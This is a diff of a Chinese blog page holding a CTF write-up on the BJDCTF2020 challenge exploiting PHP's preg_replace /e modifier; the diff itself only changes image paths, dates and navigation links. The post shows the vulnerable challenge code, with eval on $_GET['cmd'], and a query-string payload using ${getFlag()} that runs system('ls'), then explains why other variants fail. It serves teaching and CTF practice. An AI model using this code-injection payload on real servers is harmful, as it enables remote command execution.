@@ -26,13 +26,13 @@
 <meta property="og:site_name" content="mekrina">
 <meta property="og:description" content="preg_match的&#x2F;e模式文章 题目来自buu-BJDCTF2020_January preg_match(pattern, 替换成的字符串, str)当pattern中采用了&#x2F; &#x2F; ..e模式时，每当str中匹配到pattern，就会把参数2当做代码执行。  参数2可控 —&gt; 直接执行命令 参数2固定格式，如  12345678910111213funct">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="http://mekrina.github.io/blogs/images/chr_to__.png">
-<meta property="og:image" content="http://mekrina.github.io/blogs/images/preg_match_syntax_error.png">
-<meta property="article:published_time" content="2025-03-08T03:51:01.582Z">
-<meta property="article:modified_time" content="2025-03-10T12:43:31.076Z">
+<meta property="og:image" content="http://mekrina.github.io/blogs/php/php%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%87%BD%E6%95%B0/chr_to__.png">
+<meta property="og:image" content="http://mekrina.github.io/blogs/php/php%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%87%BD%E6%95%B0/preg_match_syntax_error.png">
+<meta property="article:published_time" content="2025-05-30T01:21:51.192Z">
+<meta property="article:modified_time" content="2025-05-30T01:24:16.890Z">
 <meta property="article:author" content="John Doe">
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="http://mekrina.github.io/blogs/images/chr_to__.png">
+<meta name="twitter:image" content="http://mekrina.github.io/blogs/php/php%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%87%BD%E6%95%B0/chr_to__.png">
   
   
   
@@ -213,8 +213,8 @@
     
       <span class="post-meta">
         <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2025-03-08 11:51" pubdate>
-          2025年3月8日 中午
+        <time datetime="2025-05-30 09:21" pubdate>
+          2025年5月30日 上午
         </time>
       </span>
     
@@ -287,10 +287,10 @@
 </ol>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">complex</span>(<span class="hljs-params"><span class="hljs-variable">$re</span>, <span class="hljs-variable">$str</span></span>) </span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">preg_replace</span>(<br>        <span class="hljs-string">&#x27;/(&#x27;</span> . <span class="hljs-variable">$re</span> . <span class="hljs-string">&#x27;)/ei&#x27;</span>,<br>        <span class="hljs-string">&#x27;strtolower(&quot;\\1&quot;)&#x27;</span>,<br>        <span class="hljs-variable">$str</span><br>    );<br>&#125;<br><span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$_GET</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$re</span> =&gt; <span class="hljs-variable">$str</span>) &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">complex</span>(<span class="hljs-variable">$re</span>, <span class="hljs-variable">$str</span>). <span class="hljs-string">&quot;\n&quot;</span>;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getFlag</span>(<span class="hljs-params"></span>)</span>&#123;<br>	@<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]);<br>&#125;<br></code></pre></td></tr></table></figure>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs payload">url?\S*=$&#123;getFlag()&#125;&amp;cmd=system(&quot;ls&quot;)<br></code></pre></td></tr></table></figure>
-<p><code>\\1</code>是正则表达式中的第一个捕获项，由于表达式是(\S*)，$str均被匹配,因此<br>执行的是<code>strtolower(&quot;$&#123;getFlag()&#125;&quot;)</code><br>接下来回答以下几个问题<br><strong>Q1：</strong> 为什么不使用.*匹配<br>A: 以下这些字符作为变量名时,会被替换成’_’,其中就包括了字符’.’<br><img src="/blogs/images/chr_to__.png" srcset="/blogs/img/loading.gif" lazyload></p>
+<p><code>\\1</code>是正则表达式中的第一个捕获项，由于表达式是(\S*)，$str均被匹配,因此<br>执行的是<code>strtolower(&quot;$&#123;getFlag()&#125;&quot;)</code><br>接下来回答以下几个问题<br><strong>Q1：</strong> 为什么不使用.*匹配<br>A: 以下这些字符作为变量名时,会被替换成’_’,其中就包括了字符’.’<br><img src="/blogs/php/php%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%87%BD%E6%95%B0/chr_to__.png" srcset="/blogs/img/loading.gif" lazyload></p>
 <p><strong>Q2:</strong> 为什么要用${getFlag()}而不用getFlag()?<br>A: 因为如果用后者,那么将执行<code>strtolower(&quot;getFlag()&quot;)</code>,其中getFlag()只是普通的字符串.而执行<code>strtolower(&quot;$&#123;getFlag()&#125;&quot;)</code>, 其中${}的格式是<a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/language.variables.variable.php">可变变量</a><br>,也就是会先自动解析{}中的变量,然后再把它作为变量名.显然$flag{…}是未定义的变量,也就是null.所以得到flag依赖于getFlag()函数中将flag打印出来<br><strong>Q3:</strong> 为什么不能直接<code>url?\S*=$&#123;system(&#39;ls&#39;)&#125;</code>?<br>A: 经测试会报错 unexpected “ls”</p>
 <p>2025&#x2F;3&#x2F;10: </p>
-<p>传递的参数是字符串，<code>&#39;</code>和<code>&quot;</code>也不例外, 因此<code>&#39;</code>变认为是一个常量字符串,<br>传递<code>url?\S*=$&#123;system(&#39;ls&#39;)&#125;</code>时, 执行的是<code>strtolower(&quot;$&#123;system(\&#39;ls\&#39;)&#125;&quot;)</code>, 也就是说<code>&#39;</code>会被转义, 因此会报<code>syntax error, unexpected &#39;</code><br><img src="/blogs/images/preg_match_syntax_error.png" srcset="/blogs/img/loading.gif" lazyload alt="alt text"><br>和网页上的报错一致</p>
+<p>传递的参数是字符串，<code>&#39;</code>和<code>&quot;</code>也不例外, 因此<code>&#39;</code>变认为是一个常量字符串,<br>传递<code>url?\S*=$&#123;system(&#39;ls&#39;)&#125;</code>时, 执行的是<code>strtolower(&quot;$&#123;system(\&#39;ls\&#39;)&#125;&quot;)</code>, 也就是说<code>&#39;</code>会被转义, 因此会报<code>syntax error, unexpected &#39;</code><br><img src="/blogs/php/php%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%87%BD%E6%95%B0/preg_match_syntax_error.png" srcset="/blogs/img/loading.gif" lazyload alt="alt text"><br>和网页上的报错一致</p>
 <p>终于…</p>
 <hr>
 <p>可能与<code>&#39;strtolower(&quot;\\1&quot;)&#39;</code>中把<code>&#39;</code>和<code>&quot;</code>都用掉了有关系,导致<br>$str这个参数不能出现引号. &#x3D;&#x3D;&gt; nope</p>
@@ -347,7 +347,7 @@
       
         <div class="license-meta-item license-meta-date">
           <div>发布于</div>
-          <div>2025年3月8日</div>
+          <div>2025年5月30日</div>
         </div>
       
       
@@ -379,9 +379,9 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/blogs/uncategorized/%E5%8F%8D%E5%90%91shell/" title="反向shell">
+                      <a href="/blogs/uncategorized/" title="">
                         <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">反向shell</span>
+                        <span class="hidden-mobile"></span>
                         <span class="visible-mobile">上一篇</span>
                       </a>
                     
@@ -389,8 +389,8 @@
                   <article class="post-next col-6">
                     
                     
-                      <a href="/blogs/SSTI/ssti%E6%A8%A1%E7%89%88%E6%B3%A8%E5%85%A5/" title="SSTI模版注入">
-                        <span class="hidden-mobile">SSTI模版注入</span>
+                      <a href="/blogs/uncategorized/" title="">
+                        <span class="hidden-mobile"></span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
